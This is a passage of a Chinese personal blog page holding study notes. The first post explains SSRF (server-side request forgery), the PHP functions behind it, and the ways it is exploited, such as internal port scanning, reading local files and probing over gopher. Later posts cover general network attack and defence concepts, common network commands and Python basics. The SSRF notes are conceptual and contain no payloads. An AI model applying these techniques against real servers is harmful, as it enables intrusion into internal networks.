        <p>什么是ssrf<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br>我理解的是相当于内网穿透，你获取到其中一个内网主机，可以用这个内网主机作为服务器向其他的内网机器发起攻击。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
<p>ssrf的利用<br>分享，通过URL地址分享网页内容，通过URL获取目标页标签等内容<br>转码服务，适应硬件设备的大小；<br>图片的加载与下载<br>图片，文章的收藏；<br>产生SSRF漏洞的函数<br>file_get_contents<br>fsockopen()<br>ssrf漏洞利用<br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<br>2.攻击运行在内网或本地的应用程序（比如溢出）;<br>3.对内网web应用进行指纹识别，通过访问默认文件实现;<br>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<br>5.利用file协议读取本地文件等。.<br>6.各个协议调用探针：http,file,dict,ftp,gopher等<br>本题目就是运用第六种，gopher协议。</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/06/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络安全学习</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-06-16T15:34:50.000Z" itemprop="datePublished">2023-06-16</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>网络安全：<br>信息安全基本要求：机密性、完整性、可用性<br>网络安全的攻防体系<br>1.攻击技术<br>（1）网络监听：自己不主动去攻击别人，而是在计算机上设置一个程序去监听目标计算机与其他计算机通信的数据。<br>（2）网络扫描：利用程序去扫描目标计算机开放的端口等，目的是发现漏洞，为入侵该计算机做准备。<br>（3）网络入侵：当探测发现对方存在漏洞后，入侵到目标计算机获取信息。<br>（4）网络后门：成功入侵目标计算机后，为了实现对”战利品“的长期控制，在目标计算机中种植木马等后门。<br>（5）网络隐身：入侵完毕退出目标计算机后，将自己入侵的痕迹清除，从而防止被对方管理员发现。<br>2.防御技术<br>（1）安全操作系统和操作系统的安全配置：操作系统是网络安全的关键。<br>（2）加密技术：为了防止被监听和数据被盗取，将所有的数据进行加密。<br>（3）防火墙技术：利用防火墙，对传输的数据进行限制，从而防止被入侵。<br>（4）入侵检测：如果网络防线最终被攻破，需要及时发出被入侵的警报。<br>（5）网络安全协议：保证传输的数据不被截获和监听。</p>
<p>常用网络命令<br>1.ping命令：通过发送ICMP包来验证与另一台TCP&#x2F;IP计算机的IP级连接。检测网络的连接性和可到达性，验证与对方计算机的连通性。<br>2.ipconfig命令：显示所有TCP&#x2F;IP网络配置信息、刷新动态主机配置协议（DHCP)和域名系统(DNS)设置。<br>3.netstat命令：显示活动的连接、计算机监听的端口、以太网统计信息、IP路由表、IPv4统计信息（IP,ICMP,TCP和UDP协议)。<br>4.net命令：用来查看计算机上的用户列表、添加和删除用户、与对方计算机建立连接、启动或者停止某网络服务等。<br>5.at命令：建立一个计划命令，并设置在某一时刻执行。但是必须首先与对方建立信任连接，知道对方计算机系统管理员密码，在对方计算机上建立一个计划任务。<br>6.tracert命令：tracert(跟踪路由)是路由跟踪实用程序，用于确定IP数据报访问目标所采取的路径。</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/06/08/python%E5%AD%A6%E4%B9%A0/">python学习</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-06-08T13:26:06.000Z" itemprop="datePublished">2023-06-08</time>
</a>

            
<div class="article-tag-list">
    <i class="icon-tag vm"></i>
    <a class="article-tag-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a>
</div>


        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>Python:<br>一， pip基础使用：<br>查看已安装的包：pip list<br>安装包：pip install (包名）<br>安装指定版本的包：pip install (包名）&#x3D;&#x3D;(版本号)<br>卸载包：pip uninstall (包名)<br>升级包：pip install –upgrade (包名)<br>帮助：  pip help<br>二， 运行python代码：<br>退出：exit()</p>
<p>函数：<br>print () 注意函数后面有空格<br>Unicode ()，是单独的，不是byte类型</p>
<p>除法运算：<br>&#x2F;，&#x2F;&#x2F; 对于&#x2F;&#x2F;这种除法叫做floor除法，会对除法的结果进行一个floor操作<br>八进制字面量表示：<br>八进制数必须写成0o777，原来的形式0777不能用；二进制必须写成0b111。<br>不等运算符：<br>!&#x3D;</p>
<p>标识符：<br>第一个字符必须是字母表中的字母或下划线_。<br>标识符的其他部分由字母、数字和下划线组成。<br>标识符对大小写敏感。</p>
<p>python保留字  即关键字</p>
<blockquote>
<blockquote>
<blockquote>
<p>keyword.kwlist<br>[‘False’, ‘None’, ‘True’, ‘and’, ‘as’, ‘assert’, ‘async’, ‘await’, ‘break’, ‘class’, ‘continue’, ‘def’, ‘del’, ‘elif’, ‘else’, ‘except’, ‘finally’, ‘for’, ‘from’, ‘global’, ‘if’, ‘import’, ‘in’, ‘is’, ‘lambda’, ‘nonlocal’, ‘not’, ‘or’, ‘pass’, ‘raise’, ‘return’, ‘try’, ‘while’, ‘with’, ‘yield’]</p>
</blockquote>
</blockquote>
</blockquote>
<p>数字(number)类型：<br>四种类型：整数、布尔型、浮点型和复数。<br>int(整数)，如1，只有一种整数类型int,表示为长整型，<br>boor(布尔)，如true<br>float(浮点型)，如1.23、3E-2<br>complex(复数)，如1+2j、1.1+2.2j</p>
<p>字符串(string):<br>pt中单引号和双引号使用相同<br>使用三引号(‘’’huo’’’)可以指定一个多行字符串<br>转义符’&#39;  反斜杠可以用来转义，使用r可以让反斜杠不发生转义。如r‘’this is a line with \n‘’会显示，并不是换行。<br>按字面意义级联字符串，如”this””is””string”会被自动转换为this is string。<br>字符串可以用+运算符连接在一起，用*运算符重复。<br>pt中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。<br>pt中的字符串不能改变。<br>pt没有单独的字符类型，一个字符就是长度为1的字符串。<br>字符串的截取的语法格式：变量[头下标:尾下标]</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/06/04/hello-world/">Hello World</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-06-04T06:53:49.441Z" itemprop="datePublished">2023-06-04</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

        
    </section>
</article>






            </div>
        </div>

        

        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>

    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?e4027971a230b210f4671f485b33846a";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
</footer>

    </main>

    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(function() {
        var nodes = {
            nav: $('#nav'),
            aside: $('#aside'),
            asideInner: $('#aside-inner'),
            navInner: $('#nav-inner')
        };

        var doing = false;
        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
            if (nodes.aside.hasClass('mobile-open')) {
                nodes.aside.removeClass('mobile-open');
            } else {
                nodes.aside.removeClass('mobile-close panel-show');
            }
            doing = false;
        });
        $('#open-panel, #aside-mask').on('click', function() {
            if (doing) {
                return;
            }

            if (nodes.aside.hasClass('panel-show')) {
                nodes.aside.addClass('mobile-close');
            } else {
                nodes.aside.addClass('mobile-open panel-show');
            }
        });
        $('#open-menus').on('click', function() {
            nodes.navInner.slideToggle('normal', slideDone);
        });

        if (window.innerWidth <= 960) {
            setTimeout(function() {
                nodes.navInner.slideUp('normal', slideDone);
            }, 3000);
        }

        function slideDone() {
            if (nodes.navInner.css('display') !== 'none') {
                nodes.navInner.css('display', '');
            }
        }

        $(window).on('resize', function() {
            if ($(this).width() > 960) {
                nodes.navInner.css('display', '');
            }
        });
    });
    </script>
    

</body>
</html>
